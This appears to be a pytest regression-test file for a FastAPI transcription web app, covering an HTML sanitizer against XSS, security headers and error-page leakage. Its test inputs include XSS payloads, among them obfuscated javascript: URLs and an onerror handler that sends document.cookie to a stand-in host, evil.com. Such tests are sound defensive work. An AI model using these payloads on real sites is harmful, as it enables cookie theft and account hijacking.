"""OWASP Top 10 regression tests.

Covers:
  A03 – Injection / XSS  (markdown rendered with Jinja ``| safe``)
  A05 – Security Misconfiguration  (security response headers)
  A09 – Security Logging & Monitoring  (no stack traces in error responses)
"""
from __future__ import annotations

import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from wisper_transcribe.web.app import create_app
from wisper_transcribe.web.routes.transcripts import _sanitize_html


@pytest.fixture
def client() -> TestClient:
    """Fresh TestClient for each test."""
    return TestClient(create_app())


# ---------------------------------------------------------------------------
# A03 – Injection / XSS
# _sanitize_html unit tests
# ---------------------------------------------------------------------------

class TestSanitizeHtml:
    """Unit-level checks on _sanitize_html."""

    def test_strips_script_tag(self):
        result = _sanitize_html("<script>alert(1)</script>")
        assert "<script>" not in result
        assert "alert(1)" not in result

    def test_strips_script_with_type_attribute(self):
        result = _sanitize_html('<script type="text/javascript">evil()</script>')
        assert "<script" not in result
        assert "evil()" not in result

    def test_strips_script_multiline(self):
        html = "<p>Before</p>\n<script>\nevil();\n</script>\n<p>After</p>"
        result = _sanitize_html(html)
        assert "<script" not in result
        assert "evil()" not in result
        assert "Before" in result
        assert "After" in result

    def test_strips_script_closing_tag_with_whitespace(self):
        # Regex-based filters miss </script > (space before >) — HTMLParser handles it.
        result = _sanitize_html("<script>evil()</script >")
        assert "evil()" not in result

    def test_strips_script_uppercase_closing_tag(self):
        result = _sanitize_html("<script>evil()</SCRIPT>")
        assert "evil()" not in result

    def test_strips_onclick_handler(self):
        result = _sanitize_html('<button onclick="evil()">click me</button>')
        assert "onclick" not in result
        assert "evil()" not in result
        assert "click me" in result

    def test_strips_onerror_handler(self):
        result = _sanitize_html('<img src="x" onerror="steal(document.cookie)">')
        assert "onerror" not in result
        assert "steal(" not in result

    def test_strips_onload_handler(self):
        result = _sanitize_html('<body onload="evil()">')
        assert "onload" not in result

    def test_preserves_safe_markup(self):
        html = "<p><strong>Speaker A</strong>: Hello world.</p><em>aside</em>"
        result = _sanitize_html(html)
        assert "<strong>" in result
        assert "<em>" in result
        assert "Hello world" in result

    # -- R17: javascript:/data: URLs and iframe/object/embed ---------------

    def test_strips_javascript_href(self):
        result = _sanitize_html('<a href="javascript:alert(1)">click</a>')
        assert "javascript:" not in result.lower()
        assert "click" in result

    def test_strips_javascript_href_uppercase(self):
        result = _sanitize_html('<a href="JAVASCRIPT:alert(1)">click</a>')
        assert "alert(1)" not in result

    def test_strips_javascript_href_with_tab_obfuscation(self):
        # Browsers tolerate embedded whitespace/control chars in the scheme.
        result = _sanitize_html('<a href="java\tscript:alert(1)">click</a>')
        assert "alert(1)" not in result

    def test_strips_javascript_href_with_newline_and_leading_space(self):
        result = _sanitize_html('<a href="  \njava\nscript:alert(1)">click</a>')
        assert "alert(1)" not in result

    def test_strips_javascript_href_charref_encoded(self):
        # convert_charrefs=True decodes &#106; -> j before the check runs.
        result = _sanitize_html('<a href="&#106;avascript:alert(1)">click</a>')
        assert "alert(1)" not in result

    def test_strips_data_url_src(self):
        result = _sanitize_html(
            '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'
        )
        assert "data:" not in result.lower()

    def test_strips_vbscript_href(self):
        result = _sanitize_html('<a href="vbscript:msgbox(1)">click</a>')
        assert "vbscript:" not in result.lower()

    def test_preserves_safe_href(self):
        result = _sanitize_html('<a href="https://example.com/page">link</a>')
        assert 'href="https://example.com/page"' in result

    def test_preserves_relative_href(self):
        result = _sanitize_html('<a href="/transcripts/foo">link</a>')
        assert 'href="/transcripts/foo"' in result

    def test_strips_iframe_and_content(self):
        result = _sanitize_html('<iframe src="https://evil.com"></iframe><p>ok</p>')
        assert "<iframe" not in result.lower()
        assert "evil.com" not in result
        assert "ok" in result

    def test_strips_object_and_content(self):
        result = _sanitize_html('<object data="x.swf">fallback</object><p>ok</p>')
        assert "<object" not in result.lower()
        assert "fallback" not in result
        assert "ok" in result

    def test_strips_embed_without_swallowing_rest(self):
        # <embed> is a void tag — an unclosed one must not swallow the
        # remainder of the document via depth tracking.
        result = _sanitize_html('<embed src="x.swf"><p>after</p>')
        assert "<embed" not in result.lower()
        assert "after" in result

    def test_strips_uppercase_iframe(self):
        result = _sanitize_html('<IFRAME src="https://evil.com"></IFRAME>ok')
        assert "evil.com" not in result
        assert "ok" in result


# ---------------------------------------------------------------------------
# A03 – XSS through the transcript detail endpoint
# ---------------------------------------------------------------------------

def _make_transcript_client(md_content: str):
    """Helper: write md_content to a temp dir and return (TestClient, stem)."""
    tmpdir = tempfile.mkdtemp()
    out_dir = Path(tmpdir)
    stem = "xss_test"
    (out_dir / f"{stem}.md").write_text(md_content, encoding="utf-8")
    return out_dir, stem


def test_transcript_detail_strips_script_tag(client: TestClient):
    """<script> in a transcript body must not survive the rendered HTML page."""
    md = "# Transcript\n\n<script>alert(document.cookie)</script>\n\nNormal content."
    out_dir, stem = _make_transcript_client(md)

    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
        resp = client.get(f"/transcripts/{stem}")

    assert resp.status_code == 200
    assert "<script>" not in resp.text
    assert "alert(document.cookie)" not in resp.text
    assert "Normal content" in resp.text


def test_transcript_detail_strips_event_handler(client: TestClient):
    """on* event handlers in a transcript must be removed from the rendered page."""
    md = 'Some audio <img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)"> end.'
    out_dir, stem = _make_transcript_client(md)

    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
        resp = client.get(f"/transcripts/{stem}")

    assert resp.status_code == 200
    assert "onerror" not in resp.text
    assert "evil.com" not in resp.text


def test_transcript_detail_preserves_safe_content(client: TestClient):
    """The sanitizer must not mangle legitimate markdown-rendered HTML."""
    md = "**Alice**: Hello there.\n\n**Bob**: Hi Alice!"
    out_dir, stem = _make_transcript_client(md)

    with patch("wisper_transcribe.web.routes.transcripts.get_output_dir", return_value=out_dir):
        resp = client.get(f"/transcripts/{stem}")

    assert resp.status_code == 200
    assert "Alice" in resp.text
    assert "Bob" in resp.text
    assert "Hello there" in resp.text


# ---------------------------------------------------------------------------
# A05 – Security Misconfiguration (security response headers)
# ---------------------------------------------------------------------------

# Routes that must carry security headers on every response.
_ROUTES = ["/", "/transcribe", "/transcripts", "/speakers", "/config"]


@pytest.mark.parametrize("route", _ROUTES)
def test_x_content_type_options(client: TestClient, route: str):
    """X-Content-Type-Options: nosniff must be set to prevent MIME-type sniffing attacks."""
    resp = client.get(route)
    assert resp.headers.get("x-content-type-options") == "nosniff"


@pytest.mark.parametrize("route", _ROUTES)
def test_x_frame_options(client: TestClient, route: str):
    """X-Frame-Options must be DENY — matching the CSP's
    ``frame-ancestors 'none'`` (R18: the two previously contradicted)."""
    resp = client.get(route)
    assert resp.headers.get("x-frame-options") == "DENY"


@pytest.mark.parametrize("route", _ROUTES)
def test_referrer_policy(client: TestClient, route: str):
    """Referrer-Policy must be set to limit referrer information leakage."""
    resp = client.get(route)
    assert resp.headers.get("referrer-policy") is not None


@pytest.mark.parametrize("route", _ROUTES)
def test_content_security_policy_present(client: TestClient, route: str):
    """Content-Security-Policy must be present on every response."""
    resp = client.get(route)
    assert resp.headers.get("content-security-policy") is not None


def test_csp_blocks_external_scripts(client: TestClient):
    """CSP script-src must not allow arbitrary external domains."""
    csp = client.get("/").headers.get("content-security-policy", "")
    assert "script-src *" not in csp
    assert "script-src http:" not in csp
    assert "script-src https:" not in csp


def test_csp_restricts_framing(client: TestClient):
    """CSP frame-ancestors must not be a wildcard."""
    csp = client.get("/").headers.get("content-security-policy", "")
    assert "frame-ancestors" in csp
    assert "frame-ancestors *" not in csp


# ---------------------------------------------------------------------------
# A09 – Security Logging & Monitoring (no internal details in error responses)
# ---------------------------------------------------------------------------

def test_no_stack_trace_in_500_response():
    """Unhandled exceptions must not expose Python stack traces to clients."""
    app = create_app()
    # raise_server_exceptions=False lets us inspect the HTTP response rather
    # than having the TestClient re-raise the exception in the test process.
    with TestClient(app, raise_server_exceptions=False) as client:
        with patch(
            "wisper_transcribe.web.routes.transcripts.get_output_dir",
            side_effect=RuntimeError("secret internal path: /home/user/.config"),
        ):
            resp = client.get("/transcripts")

    assert resp.status_code == 500
    body = resp.text
    assert "Traceback" not in body
    assert "secret internal path" not in body
    assert "/home/user" not in body
